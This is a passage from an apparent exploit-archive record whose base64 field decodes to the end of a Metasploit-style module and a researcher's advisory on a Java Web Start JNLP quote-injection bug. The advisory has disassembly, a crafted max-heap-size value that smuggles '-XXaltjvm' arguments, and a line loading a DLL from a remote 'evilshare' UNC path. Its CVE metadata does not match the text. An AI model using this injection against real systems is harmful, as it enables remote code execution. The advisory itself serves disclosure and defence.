iREFWIHJlcXVpcmVzIFNSVlBPUlQ9ODAgYW5kIFVSSVBBVEg9LycNCiAgICAgICAgZW5kDQoNCiAgICAgICAgc3VwZXINCiAgICBlbmQNCg0KZW5kDQoNCj1iZWdpbg0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpKYXZhIFdlYiBTdGFydDogVGhlIG5leHQgUXVvdGUgSW5qZWN0IEJ1ZyAoQ1ZFIDIwMTItMTUzMykNCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KDQpIZWxsbyBhbGwsDQoNClRoaXMgYnVnIGlzIGRpZmZlcmVudCBmcm9tIENWRS0yMDEyLTA1MDAgd2hpY2ggd2FzIGRpc2Nsb3NlZCBvbiBGZWIuIDE1IDIwMTIsIGJ1dA0KYWxsb3dzIHJlbW90ZSBjb2RlIGV4ZWN1dGlvbiBpbiB0aGUgc2FtZSB3YXkuDQoNCg0KPT09PT09PT09PT09PT09PT09PT09PQ0KVnVsbmVyYWJpbGl0eSBPdmVydmlldw0KPT09PT09PT09PT09PT09PT09PT09PQ0KDQpUaGVyZSBleGlzdHMgYW4gaW5wdXQgdmFsaWRhdGlvbiB2dWxuZXJhYmlsaXR5IGluIGF0IGxlYXN0IEphdmEgV2ViIFN0YXJ0IDEuNi4zNQ0KYW5kIDEuNy4wNyB3aGVuIHBhcnNpbmcgSk5MUCBmaWxlcy4NCkEgZmxhdyBleGlzdHMgaW4gdGhlIHJvdXRpbmUgd2hpY2ggcGVyZm9ybXMgY2hlY2tzIG9uIHRoZSBwYXJhbWV0ZXIgdmFsdWVzIGZyb20NCmEgSk5MUCBmaWxlLiBJdCBhbGxvd3MgdGhlIGluamVjdGlvbiBvZiBub24gZXNjYXBlZCBkb3VibGUgcXVvdGVzICgiKSBpbnRvIHBhcmFtZXRlcnMNCm9mIHRoZSBjb21tYW5kIGxpbmUgb2YgamF2YXcuZXhlLiBQYXJhbWV0ZXJzICJpbnRpYWwtaGVhcC1zaXplIiBhbmQgIm1heC1oZWFwLXNpemUiIGluIGENCkpOTFAgZmlsZSBjYW4gY29udGFpbiBhIGRvdWJsZSBxdW90ZSB3aGljaCBpcyBub3QgcHJvcGVybHkgc2FuaXRpemVkIHdoZW4gY3JlYXRpbmcNCnRoZSBjb21tYW5kIGxpbmUgZm9yIGphdmF3LmV4ZS4gVGhpcyBtYWtlcyBpdCBwb3NzaWJsZSB0byBnZXQgYSBjb21tYW5kIGxpbmUgcGFyYW1ldGVyDQp3aXRoIGEgdmFsdWUgY29uc2lzdGluZyBvbmx5IG9mIG9uZSBkb3VibGUgcXVvdGUgaW5qZWN0ZWQuIEZ1cnRoZXIgdGhpcyBhbGxvd3MgbWFuaXB1bGF0aW5nDQp0aGUgY29tbWFuZCBsaW5lIGFuZCB0aGUgaW5qZWN0aW9uIG9mIGUuZy4gdGhlICItWFhhbHRqdm0iIG9wdGlvbiBsZWFkaW5nIHRvIFJDRS4NCg0KDQo9PT09PT09PT09PT09PT09PT09PT09DQpWdWxuZXJhYmlsaXR5IERldGFpbHMNCj09PT09PT09PT09PT09PT09PT09PT0NCg0KTm90ZXM6DQotLS0tLS0NClsqXSBBIEpOTFAgcGFyYW1ldGVyIHdpbGwgYmUgcmVmZXJlZCB0byAgYnkgbmFtZT12YWx1ZSAoZS5nLjogaW5pdGlhbC1oZWFwLXNpemU9JzY0bSInICkNClsqXSBBbmFseXNpcyBpcyBkb25lIG9uIFdpblhQIDMyQml0IFNQMyBFTiB3aXRoIE9yYWNsZSBKUkUgMS42LjMxDQpbKl0gamF2YXdzLmV4ZSBoYXMgdGhlIGJhc2UgYWRkcmVzcyBvZiAweDAwNDAwMDAwIGluIG1lbW9yeQ0KWypdIEFycm93cyAoLS0+KSBpbmRpY2F0ZSBjb2RlIGNvbnRpbnVhdGlvbiBvbiBuZXh0IGFkZHJlc3MgYmxvY2sNCi0tLS0tLQ0KDQpWdWxuZXJhYmxlIHByb2dyYW0gZmxvdzoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KWypdIElmIGEgSk5MUCBmaWxlIGlzIG9wZW5lZCBieSBqYXZhd3MuZXhlLCBpdCBpcyByZWFkIGludG8gbWVtb3J5DQphbmQgc2F2ZWQgdGVtcG9yYXJ5IGluICVURU1QJS4NCg0KWypdIEpOTFAgcGFyYW1ldGVycyBhcmUgcGFyc2VkOg0KW2FdIENoZWNrIGlmIGEgSk5MUCB2YWx1ZSBiZWdpbnMgd2l0aCBhIHNpbmdsZSBvciBhIGRvdWJsZSBxdW90ZToNCihFQVggcG9pbnRzIHRvIGEgdmFsdWUgb2YgSk5MUCBwYXJhbWV0ZXIgZW5jbG9zZWQgd2l0aCBzaW5nbGUgcXVvdGVzIGUuZy46ICc2NG0iJyA7IG5vdGUgdGhlIGRvdWJsZSBxdW90ZSBpbnNpZGUpDQowMDQwNEQ2MCAgTU9WIENMLEJZVEUgUFRSIERTOltFQVhdICAgICAgOyBDTDogMXN0IGNoYXIgb2YgJzY0bSInIChzaW5nbGUgcXVvdGUgPSAweDI3KQ0KMDA0MDRENjIgIENNUCBDTCwyMiAgICAgICAgICAgICAgICAgICAgIDsgY2hlY2sgZm9yIGRvdWJsZSBxdW90ZQ0KMDA0MDRENjUgIE1PViBEV09SRCBQVFIgRFM6WzQyMjdDNF0sRUFYIA0KMDA0MDRENkEgIEpFIFNIT1JUIGphdmF3cy4wMDQwNEQ5RiAgICAgIDsgam1wIGlzIG5vdCB0YWtlbg0KMDA0MDRENkMgIENNUCBDTCwyNyAgICAgICAgICAgICAgICAgICAgIDsgY2hlY2sgZm9yIHNpbmdsZSBxdW90ZQ0KMDA0MDRENkYgIEpFIFNIT1JUIGphdmF3cy4wMDQwNEQ5RiAgICAgIDsgam1wIGlzIHRha2VuIC0tPg0KLi4uDQoNCltiXSBzdHJpcCBxdW90ZXMgd2hpY2ggZW5jbG9zZSB0aGUgSk5MUCB2YWx1ZSBhbmQgc3RvcmUgaXQ6DQowMDQwNEQ5RiAgSU5DIEVBWCAgICAgICAgICAgICAgICAgICAgICAgOyBwb2ludHMgdG8gMm5kIGNoYXIgb2YgSk5MUCB2YWx1ZSAoMXN0IGNoYXIgYWZ0ZXIgc2luZ2xlIHF1b3RlKQ0KMDA0MDREQTAgIE1PViBETCxDTCAgICAgICAgICAgICAgICAgICAgIDsgREw6IDB4MjcgKHNpbmdsZSBxdW90ZSkNCjAwNDA0REEyICBNT1YgQ0wsQllURSBQVFIgRFM6W0VBWF0gICAgICA7IENMOiAybmQgY2hhciBvZiBKTkxQIHZhbHVlICgweDM2KQ0KMDA0MDREQTQgIE1PViBEV09SRCBQVFIgRFM6WzQyMjdDNF0sRUFYDQowMDQwNERBOSAgTU9WIEVTSSxFQVgNCjAwNDA0REFCICBKTVAgU0hPUlQgamF2YXdzLjAwNDA0REI0ICAgICA7IHN0YXJ0IGxvb3ANCjAwNDA0REFEICAvQ01QIENMLERMICAgICAgICAgICAgICAgICAgICA7IGNvbXBhcmUgY2hhciBvZiBKTkxQIHZhbHVlIHRvIHNpbmdsZSBxdW90ZQ0KMDA0MDREQUYgIHxKRSBTSE9SVCBqYXZhd3MuMDA0MDREQjggICAgIDsgbG9vcCB1bnRpbCBhbm90aGVyIHNpbmdsZSBxdW90ZSBpbiBKTkxQIHZhbHVlIGlzIGVuY291bnRlcmVkDQowMDQwNERCMSAgfElOQyBFU0kgICAgICAgICAgICAgICAgICAgICAgOyBpbmNyZWFzZSBwb2ludGVyIHRvIGNoYXJzIGluIEpOTFAgdmFsdWUNCjAwNDA0REIyICB8TU9WIENMLEJZVEUgUFRSIERTOltFU0ldICAgICA7IHB1dCBuZXh0IGNoYXIgb2YgdmFsdWUgaW50byBDTA0KMDA0MDREQjQgICBURVNUIENMLENMDQowMDQwNERCNiAgXEpOWiBTSE9SVCBqYXZhd3MuMDA0MDREQUQgICAgDQowMDQwNERCOCAgUFVTSCBFQVgNCjAwNDA0REI5ICBQVVNIIDYNCjAwNDA0REJCICBNT1YgRUFYLEVTSQ0KMDA0MDREQkQgIENBTEwgamF2YXdzLjAwNDA0QkY4ICAgICAgICAgIDsgc3RvcmUgc3RyaXBwZWQgSk5MUCB2YWx1ZSAoIGluIHRoZSBleGFtcGxlIGNhc2U6IDY0bSIgKQ0KLi4uDQoNClsqXSBUaGUgc3RyaXBwZWQgSk5MUCB2YWx1ZXMgYXJlIHVzZWQgdG8gY29uc3RydWN0IHRoZSBjb21tYW5kIGxpbmUgcGFyYW1ldGVyIGZvciBqYXZhdy5leGUNCihlLmcuOiBmb3IgSk5MUCBwYXJhbWV0ZXIgd2l0aCBuYW1lIGluaXRpYWwtaGVhcC1zaXplKSA6DQowMDQwMTg5NSAgUFVTSCBqYXZhd3MuMDA0MTgzMzAgICAgICAgICAgOyBBU0NJSTogLVhtcyVzDQowMDQwMTg5QSAgUFVTSCBFQlgNCjAwNDAxODlCICBQVVNIIEVBWA0KMDA0MDE4OUMgIENBTEwgamF2YXdzLjAwNDA2RDI2ICAgICAgICAgIDsgY29uc3RydWN0IGNvbW1hbmQgbGluZSBwYXJhbWV0ZXIgd2l0aCAtWG1zJXMgYW5kIDY0bSINCjAwNDAxOEExICBMRUEgRUFYLERXT1JEIFBUUiBTUzpbRUJQLTQwMF07IEVBWCBwb2ludHMgdG8gY29tbWFuZCBsaW5lIHBhcmFtZXRlciAtWG1zNjRtIiAod2l0aCBzdGlsbCBvbmUgZG91YmxlIHF1b3RlKQ0KLi4uDQoNClsqXSBBbGwgY29uc3RydWN0ZWQgY29tbWFuZCBsaW5lIHBhcmFtZXRlcnMgZm9yIGphdmF3LmV4ZSBhcmUgc2FuZSBjaGVja2VkOg0KMDA0MDJCMDIgIENBTEwgamF2YXdzLjAwNDA2OTExICAgICAgICAgIDsgcnVuIGNoZWNrIHJvdXRpbmUgLS0+DQouLi4NCjAwNDA2OTExICBQVVNIIEVCUA0KMDA0MDY5MTIgIE1PViBFQlAsRVNQDQowMDQwNjkxNCAgUFVTSCBFQlgNCjAwNDA2OTE1ICBQVVNIIEVTSQ0KMDA0MDY5MTYgIFBVU0ggRURJDQowMDQwNjkxNyAgTU9WIEVESSxEV09SRCBQVFIgU1M6W0VCUCsxMF0gOyBFU0k6IHBvaW50ZXIgdG8gcG9pbnRlcnMgdG8gY29tbWFuZCBsaW5lIHBhcmFtZXRlcnMNCjAwNDA2OTFBICBYT1IgRUJYLEVCWA0KMDA0MDY5MUMgIENNUCBEV09SRCBQVFIgRFM6W0VESV0sRUJYDQowMDQwNjkxRSAgTU9WIEVTSSxFREkNCjAwNDA2OTIwICBKRSBTSE9SVCBqYXZhd3MuMDA0MDY5MzMNCjAwNDA2OTIyICAvUFVTSCBEV09SRCBQVFIgRFM6W0VTSV0gICAgICA7IHB1c2ggcG9pbnRlciB0byBjb21tYW5kIGxpbmUgcGFyYW1ldGVyDQowMDQwNjkyNCAgfENBTEwgamF2YXdzLjAwNDA2MTcwICAgICAgICAgOyBydW4gY2hlY2sgb24gY29tbWFuZCBsaW5lIHBhcmFtZXRlciAtLT4NCjAwNDA2OTI5ICB8TU9WIERXT1JEIFBUUiBEUzpbRVNJXSxFQVgNCjAwNDA2OTJCICB8QUREIEVTSSw0ICAgICAgICAgICAgICAgICAgICA7IEVTSTogcG9pbnRlciB0byBuZXh0IGNvbW1hbmQgbGluZSBwYXJhbWV0ZXINCjAwNDA2OTJFICB8Q01QIERXT1JEIFBUUiBEUzpbRVNJXSxFQlgNCjAwNDA2OTMwICB8UE9QIEVDWA0KMDA0MDY5MzEgIFxKTlogU0hPUlQgamF2YXdzLjAwNDA2OTIyICAgIDsgbG9vcCB1bnRpbCBlbmQgb2YgcG9pbnRlciBsaXN0DQouLi4NCjAwNDA2MTcwICBQVVNIIEVCWA0KMDA0MDYxNzEgIE1PViBFQlgsRFdPUkQgUFRSIFNTOltFU1ArOF0gIDsgRUJYOiBwb2ludGVyIHRvIGNvbW1hbmQgbGluZSBwYXJhbWV0ZXIgKCBlLmcuOiAtWG1zNjRtIiApDQowMDQwNjE3NSAgVEVTVCBFQlgsRUJYDQowMDQwNjE3NyAgSk5aIFNIT1JUIGphdmF3cy4wMDQwNjE3RCAgICAgOyAtLT4NCi4uLg0KMDA0MDYxN0QgIE1PViBFQVgsRUJYDQowMDQwNjE3RiAgTEVBIEVEWCxEV09SRCBQVFIgRFM6W0VBWCsxXSAgOyBFRFg6IHBvaW50ZXIgdG8gY29tbWFuZCBsaW5lIHBhcmFtZXRlciB3aXRob3V0IGh5cGhlbiAoIFhtczY0bSIgKQ0KMDA0MDYxODIgIC9NT1YgQ0wsQllURSBQVFIgRFM6W0VBWF0NCjAwNDA2MTg0ICB8SU5DIEVBWA0KMDA0MDYxODUgIHxURVNUIENMLENMDQowMDQwNjE4NyAgXEpOWiBTSE9SVCBqYXZhd3MuMDA0MDYxODINCjAwNDA2MTg5ICBQVVNIIEVTSSAgICAgICAgICAgICAgICAgICAgICA7IHBvaW50ZXIgdG8gcG9pbnRlciBvZiAtWG1zNjRtIg0KMDA0MDYxOEEgIFNVQiBFQVgsRURYICAgICAgICAgICAgICAgICAgIDsgRUFYOiBsZW5ndGggb2YgWG1zNjRtIlx4MDANCjAwNDA2MThDICBQVVNIIGphdmF3cy4wMDQxOTlCOCAgICAgICAgICA7IEFTQ0lJIFx4MjBceDA5IChzcGFjZSBhbmQgdGFiKQ0KMDA0MDYxOTEgIFBVU0ggRUJYICAgICAgICAgICAgICAgICAgICAgIDsgcG9pbnRlciB0byAtWG1zNjRtIg0KMDA0MDYxOTIgIE1PViBFU0ksRUFYDQowMDQwNjE5NCAgQ0FMTCBqYXZhd3MuMDA0MDk1OTAgICAgICAgICAgOyBjaGVjayBmb3Igc3BhY2UgYW5kIHRhYiBpbiAtWG1zNjRtIiA7IHJldHVybiAweDAgaW4gRUFYIGlmIGl0J3Mgbm90IGZvdW5kDQowMDQwNjE5OSAgVEVTVCBFQVgsRUFYICAgICAgICAgICAgICAgICAgOyBFQVg6IDB4MCBmb3IgLVhtczY0bSINCjAwNDA2MTlCICBQT1AgRUNYDQowMDQwNjE5QyAgUE9QIEVDWA0KMDA0MDYxOUQgIEpOWiBTSE9SVCBqYXZhd3MuMDA0MDYxQTggICAgIDsgam1wIHRvIHJvdXRpbmUgd2hpY2ggY2hlY2tzIGFuZCBlc2NhcGVzICIgYW5kIFwgaXMgbm90IHRha2VuICEhIFRoZSBjaGVja3MgYXJlIG5vdCBwZXJmb3JtZWQgISENCjAwNDA2MTlGICBQVVNIIEVCWA0KMDA0MDYxQTAgIENBTEwgamF2YXdzLjAwNDEyN0Y0ICAgICAgICAgIDsgY29weSBvZiAtWG1zNjRtIiAofiBzdHJkdXApDQowMDQwNjFBNSAgUE9QIEVDWA0KMDA0MDYxQTYgIEpNUCBTSE9SVCBqYXZhd3MuMDA0MDYyMTUgICAgIDsgam1wIG92ZXIgdGhlIGNoZWNrIHJvdXRpbmVzICEhIC0tLS0tLS0tLS0tLS0tLS0tLS0tLT4gMDA0MDYyMTUgIA0KMDA0MDYxQTggIENNUCBFU0ksMQ0KMDA0MDYxQUIgIEpMRSBTSE9SVCBqYXZhd3MuMDA0MDYxQjkNCjAwNDA2MUFEICBDTVAgQllURSBQVFIgRFM6W0VCWF0sMjINCjAwNDA2MUIwICBKTlogU0hPUlQgamF2YXdzLjAwNDA2MUI5DQowMDQwNjFCMiAgQ01QIEJZVEUgUFRSIERTOltFU0krRUJYLTFdLDIyDQowMDQwNjFCNyAgSkUgU0hPUlQgamF2YXdzLjAwNDA2MTlGDQowMDQwNjFCOSAgWE9SIEVBWCxFQVgNCjAwNDA2MUJCICBURVNUIEVTSSxFU0kNCjAwNDA2MUJEICBMRUEgRURYLERXT1JEIFBUUiBEUzpbRVNJKzNdDQowMDQwNjFDMCAgSkxFIFNIT1JUIGphdmF3cy4wMDQwNjFENQ0KMDA0MDYxQzIgIC9NT1YgQ0wsQllURSBQVFIgRFM6W0VBWCtFQlhdDQowMDQwNjFDNSAgfENNUCBDTCwyMg0KMDA0MDYxQzggIHxKRSBTSE9SVCBqYXZhd3MuMDA0MDYxQ0YNCjAwNDA2MUNBICB8Q01QIENMLDVDDQowMDQwNjFDRCAgfEpOWiBTSE9SVCBqYXZhd3MuMDA0MDYxRDANCjAwNDA2MUNGICB8SU5DIEVEWA0KMDA0MDYxRDAgIHxJTkMgRUFYDQowMDQwNjFEMSAgfENNUCBFQVgsRVNJDQowMDQwNjFEMyAgXEpMIFNIT1JUIGphdmF3cy4wMDQwNjFDMg0KMDA0MDYxRDUgIFBVU0ggRURYDQowMDQwNjFENiAgQ0FMTCBqYXZhd3MuMDA0MDg5Q0QNCjAwNDA2MURCICBURVNUIEVBWCxFQVgNCjAwNDA2MUREICBQT1AgRUNYDQowMDQwNjFERSAgSkUgU0hPUlQgamF2YXdzLjAwNDA2MjE1DQowMDQwNjFFMCAgWE9SIEVDWCxFQ1gNCjAwNDA2MUUyICBQVVNIIEVESQ0KMDA0MDYxRTMgIElOQyBFQ1gNCjAwNDA2MUU0ICBYT1IgRURJLEVESQ0KMDA0MDYxRTYgIFRFU1QgRVNJLEVTSQ0KMDA0MDYxRTggIE1PViBCWVRFIFBUUiBEUzpbRUFYXSwyMiAgICAgIDsgKioqIHByZXBlbmQgY29tbWFuZCBsaW5lIHBhcmFtZXRlciB3aXRoIGRvdWJsZSBxdW90ZQ0KMDA0MDYxRUIgIEpMRSBTSE9SVCBqYXZhd3MuMDA0MDYyMEINCjAwNDA2MUVEICAvTU9WIERMLEJZVEUgUFRSIERTOltFREkrRUJYXQ0KMDA0MDYxRjAgIHxDTVAgREwsMjIgICAgICAgICAgICAgICAgICAgIDsgKioqIGNoZWNrIGZvciAiDQowMDQwNjFGMyAgfEpFIFNIT1JUIGphdmF3cy4wMDQwNjFGQQ0KMDA0MDYxRjUgIHxDTVAgREwsNUMgICAgICAgICAgICAgICAgICAgIDsgKioqIGNoZWNrIGZvciBcDQowMDQwNjFGOCAgfEpOWiBTSE9SVCBqYXZhd3MuMDA0MDYxRkYNCjAwNDA2MUZBICB8TU9WIEJZVEUgUFRSIERTOltFQVgrRUNYXSw1QyA7ICoqKiBlc2NhcGUgIiBvciBcIHdpdGggXCAoIiBiZWNvbWVzIFwiIGFuZCBcIGJlY29tZXMgXFwgKQ0KMDA0MDYxRkUgIHxJTkMgRUNYDQowMDQwNjFGRiAgfE1PViBETCxCWVRFIFBUUiBEUzpbRURJK0VCWF0NCjAwNDA2MjAyICB8TU9WIEJZVEUgUFRSIERTOltFQVgrRUNYXSxETA0KMDA0MDYyMDUgIHxJTkMgRUNYDQowMDQwNjIwNiAgfElOQyBFREkNCjAwNDA2MjA3ICB8Q01QIEVESSxFU0kNCjAwNDA2MjA5ICBcSkwgU0hPUlQgamF2YXdzLjAwNDA2MUVEDQowMDQwNjIwQiAgQUREIEVDWCxFQVgNCjAwNDA2MjBEICBNT1YgQllURSBQVFIgRFM6W0VDWF0sMjIgICAgICA7ICoqKiBhcHBlbmQgY29tbWFuZCBsaW5lIHBhcmFtZXRlciB3aXRoIGRvdWJsZSBxdW90ZSB0byBlbmNsb3NlIGl0IA0KMDA0MDYyMTAgIE1PViBCWVRFIFBUUiBEUzpbRUNYKzFdLDANCjAwNDA2MjE0ICBQT1AgRURJDQowMDQwNjIxNSAgUE9QIEVTSSAgICAgICAgICAgICAgICAgICAgICAgOyAtLS0tLS0tLS0tLS0tLS0tLT4gd2UgbGFuZCBoZXJlDQowMDQwNjIxNiAgUE9QIEVCWA0KMDA0MDYyMTcgIFJFVE4NCi4uLg0KDQpbKl0gQXQgdGhpcyBwb2ludCB3ZSBoYXZlIGNpcmN1bXZlbnRlZCB0aGUgY2hlY2tzIGFuZCBvdXIgSk5MUCBwYXJhbWV0ZXIgaW5pdGlhbC1oZWFwLXNpemU9JzY0bSInIGJlY29tZXMNCnRoZSBjb21tYW5kIGxpbmUgcGFyYW1ldGVyIFhtczY0bSIuIEJhc2ljYWxseSB0aGlzIGhhcHBlbnMgZHVlIHRvIHRoZSBwb3NzaWJpbGl0eSB0byBlbmNsb3NlIGRvdWJsZSBxdW90ZXMNCmluc2lkZSBzaW5nbGUgcXVvdGVkIEpOTFAgdmFsdWVzIChzZWUgW2FdIGFuZCBbYl0pIGFuZCB1bnN1ZmZpY2llbnQgY2hlY2tpbmcgZm9yIGRvdWJsZSBxdW90ZXMgaW5zaWRlDQp0aGUgY29uc3RydWN0ZWQgY29tbWFuZCBsaW5lIHBhcmFtZXRlciAoc2VlIDAwNDA2MTlEICkuDQoNClsqXSBXZSBjYW4gbm93IGluamVjdCBjb21tYW5kIGxpbmUgcGFyYW1ldGVycyB2aWEgdGhlIEpOTFAgcGFyYW1ldGVyIG1heC1oZWFwLXNpemU9IiAtUGFyYW1BPUluamVjdEEgLVBhcmFtQj1JbmplY3RCICINCndoaWNoIHdpbGwgYmVjb21lIHRoZSBjb21tYW5kIGxpbmUgcGFyYW1ldGVyICItWG14IC1QYXJhbUE9SW5qZWN0QSAtUGFyYW1CPUluamVjdEIgIg0KDQpbKl0gVGhlIGNvbW1hbmQgbGluZSBmb3IgamF2YXcuZXhlIHRoZW4gY29udGFpbnMgdGhlIHR3byBwYXJhbWV0ZXJzIGFmdGVyIGVhY2ggb3RoZXIsIHNvIHdlIGdldDoNCmphdmF3LmV4ZSBbLi4uXSAtWG1zNjRtIiAiLVhteCAtUGFyYW1BPUluamVjdEEgLVBhcmFtQj1JbmplY3RCICIgWy4uLl0gIi1hbm90aGVyIHBhcmFtZXRlciBYIiAiLWFub3RoZXIgcGFyYW1ldGVyIFkgIiBbLi4uXQ0KDQpbKl0gQWx0aG91Z2ggdGhlIGphdmF3LmV4ZSBjb21tYW5kIGxpbmUgaXMgY29ycnVwdGVkIGR1ZSB0byB1bmNsb3NlZCBhbmQgd3JvbmdseSBlc2NhcGVkIGRvdWJsZSBxdW90ZXMgYW4gaW5qZWN0aW9uDQp3b3JrcyB3aXRoIC1YWGFsdGp2bT1cSVBcZXZpbHNoYXJlLiBKYXZhdy5leGUgd2lsbCBzZWFyY2ggZm9yIGEganZtLmRsbCBvbiBhIHJlbW90ZSB1bmMgbG9jYXRpb24gXFxJUFxldmlsc2hhcmUgKHdoaWNoIGNhbg0KYmUgb24gYSB3ZWJzZXJ2ZXIpIGFuZCBleGVjdXRlIGl0Lg0KDQoNCj09PQ0KRml4DQo9PT0NCg0KWypdIFRoaXMgdnVsbmVyYWJpbGl0eSB3YXMgZml4ZWQgYnkgT3JhY2xlIGluIE9jdC4gMjAxMg0KaHR0cDovL3d3dy5vcmFjbGUuY29tL3RlY2huZXR3b3JrL3RvcGljcy9zZWN1cml0eS9qYXZhY3B1b2N0MjAxMi0xNTE1OTI0Lmh0bWwNClRoZSBmaXggaW5zZXJ0ZWQgYW4gYWRkaXRpb25hbCBjaGVjayB0byAiaW5pdGlhbC1oZWFwLXNpemUiIGFuZCAibWF4LWhlYXAtc2l6ZSIgcGFyYW1ldGVycy4NCkNvbXBhcmlzb24gYmV0d2VlbiBqYXZhd3MuZXhlIDEwLjcuMi4xMCAoSmF2YSAxLjcuMDcpIGFuZCBqYXZhd3MuZXhlIDEwLjkuMi4wNSAoSmF2YSAxLjcuMDkpIHlpZWxkcyB0aGUgZm9sbG93aW5nOg0KDQpbYV0gQWxsIGZ1bmN0aW9ucyBhcmUgaWRlbnRpY2FsIGV4Y2VwdCBzdWJfNDA0QkI5IGFuZCBhIG5ldyBmdW5jdGlvbiBzdWJfNDA2RTBFIHdhcyBhZGRlZDoNCmh0dHA6Ly9zMTgucG9zdGltZy5vcmcvZ3kwNG4zanc5L2RpZmZfMV83XzdfMV83XzkucG5nDQoNCltiXSBUaGUgb25seSBkaWZmZXJlbmNlIGluIHN1Yl80MDRCQjkgYmV0d2VlbiB0aGUgdHdvIHZlcnNpb25zIGlzIHRoZSB1c2Ugb2Ygc3ViXzQwNkUwRSB0byB2YWxpZGF0ZSB0aGUgcGFyYW1ldGVyDQp2YWx1ZXMgZ2FpbmVkIGJ5IHN1Yl80MDVCRDU6DQpodHRwOi8vczcucG9zdGltZy5vcmcvaGpnbmVjb2Q3L3N1Yl80MDRiYjlfZGlmZmVkLnBuZw0KDQoNClsqXSBBbiBvbGQgZGVwcmVjYXRlZCBzZWxmIG1hZGUgZml4IGlzIGF2YWlsYWJsZSB3aGljaCBmaXhlZCB0aGlzIGlzc3VlIGluIGEgZGlmZmVyZW50IHdheSwgYmFjayBpbiB0aGUgZGF5cw0Kd2hlbiBpdCB3YXMgYSAwZGF5Og0KaHR0cDovL3Bhc3RlYmluLmNvbS85Unp0d1Zleg0KDQoNCg0KDQpDaGVlcnMsDQoNClJoMA0KPWVuZA==", 
    "filename": "platforms/multiple/remote/26123.rb", 
    "id": "26123", 
    "cves": [
        "CVE-2012-0500"
    ]
}